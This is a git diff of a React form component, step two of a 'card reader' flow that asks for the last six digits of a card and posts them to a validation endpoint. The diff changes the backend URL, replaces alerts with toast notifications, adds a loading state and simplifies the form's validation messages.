@@ -1,6 +1,8 @@
 import { useForm } from "react-hook-form";
 import { useNavigate } from "react-router-dom";
 import { FaArrowRight, FaArrowLeft } from "react-icons/fa";
+import { toast } from "react-toastify";
+import { useState } from "react";
 
 function Stepii({ nextStep, prevStep }) {
   const {
@@ -12,38 +14,29 @@ function Stepii({ nextStep, prevStep }) {
     defaultValues: { lastSixDigits: "" },
   });
   const navigate = useNavigate();
+  const [isLoading, setIsLoading] = useState(false);
 
   const onSubmit = (data) => {
-    fetch("https://card-reader-backend-ls73.onrender.com/validate-digits", {
+    setIsLoading(true);
+    fetch("https://card-reader-mu.vercel.app/validate-digits", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ lastSixDigits: data.lastSixDigits }),
     })
-      .then((response) => {
-        if (!response.ok) {
-          return response.json().then((errorData) => {
-            throw new Error(
-              errorData.message ||
-                `HTTP error! Status: ${response.status} - ${response.statusText}`
-            );
-          });
-        }
-        return response.json();
-      })
+      .then((response) => response.json())
       .then((result) => {
         if (result.message === "Digits validated successfully") {
+          toast.success("Digits validated!");
           nextStep();
           navigate("/stepiii");
         } else {
-          alert(result.message);
+          toast.error(result.message);
         }
       })
-      .catch((error) => {
-        console.error("Fetch error in Step II:", error);
-        alert(
-          `Server error. Details: ${error.message}. Check console for more info.`
-        );
-      });
+      .catch(() => {
+        toast.error("Server error.");
+      })
+      .finally(() => setIsLoading(false));
   };
 
   return (
@@ -59,11 +52,8 @@ function Stepii({ nextStep, prevStep }) {
         <input
           type="text"
           {...register("lastSixDigits", {
-            required: "Last 6 digits are required.",
-            pattern: {
-              value: /^[0-9]{6}$/,
-              message: "Please enter exactly 6 digits.",
-            },
+            required: true,
+            pattern: /^[0-9]{6}$/,
           })}
           style={{
             width: "100%",
@@ -75,11 +65,6 @@ function Stepii({ nextStep, prevStep }) {
           placeholder="e.g. 676891"
           maxLength={6}
         />
-        {errors.lastSixDigits && (
-          <p style={{ color: "red", fontSize: "12px" }}>
-            {errors.lastSixDigits.message}
-          </p>
-        )}
       </div>
       <button
         type="submit"
@@ -94,9 +79,10 @@ function Stepii({ nextStep, prevStep }) {
           alignItems: "center",
           justifyContent: "center",
         }}
-        disabled={!!errors.lastSixDigits}
+        disabled={isLoading}
       >
-        Next Step <FaArrowRight style={{ marginLeft: "8px" }} />
+        {isLoading ? "Loading..." : "Next Step"}{" "}
+        <FaArrowRight style={{ marginLeft: "8px" }} />
       </button>
       <button
         type="button"
